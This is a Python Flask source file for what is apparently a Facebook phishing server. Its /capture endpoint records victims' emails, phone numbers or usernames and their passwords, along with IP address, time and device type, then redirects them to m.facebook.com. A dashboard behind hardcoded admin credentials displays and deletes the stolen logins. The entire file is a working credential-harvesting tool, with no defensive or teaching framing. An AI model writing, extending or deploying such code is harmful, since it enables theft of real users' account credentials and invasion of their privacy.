from flask import Flask, request, render_template, jsonify, redirect, url_for, session
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'd29c234ca310aa6990092d4b6cd4c4854585c51e1f73bf4de510adca03f5bc4e'

# Simulated storage with enhanced fields
captured_creds = []
next_id = 1
ADMIN_CREDENTIALS = {'username': '4!cks', 'password': '0220Mpc'}

@app.route("/")
def home():
    # Detect mobile devices
    user_agent = request.headers.get('User-Agent', '').lower()
    mobile = any(m in user_agent for m in ['mobile', 'iphone', 'android', 'blackberry'])
    return render_template("index.html", mobile=mobile)

@app.route("/capture", methods=["POST"])
def capture():
    global next_id
    data = request.json
    
    identifier = data.get('identifier', '')
    identifier_type = 'email' if '@' in identifier and '.' in identifier else 'phone' if identifier.isdigit() else 'username'
    
    captured_creds.append({
        "id": next_id,
        "identifier": identifier,
        "identifier_type": identifier_type,
        "ip": request.remote_addr,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "password": data.get('password', ''),
        "device": "Mobile" if "mobile" in request.headers.get('User-Agent', '').lower() else "Desktop"
    })
    
    next_id += 1
    return jsonify({"status": "success", "redirect": "https://m.facebook.com"})

@app.route("/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        if username == ADMIN_CREDENTIALS["username"] and password == ADMIN_CREDENTIALS["password"]:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))
    return render_template("dashboard.html", data=captured_creds)

@app.route("/delete/<int:entry_id>", methods=["POST"])
def delete_entry(entry_id):
    if not session.get("logged_in"):
        return jsonify({"status": "unauthorized"}), 403
    
    global captured_creds
    captured_creds = [entry for entry in captured_creds if entry["id"] != entry_id]
    return jsonify({"status": "deleted"})

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("home"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)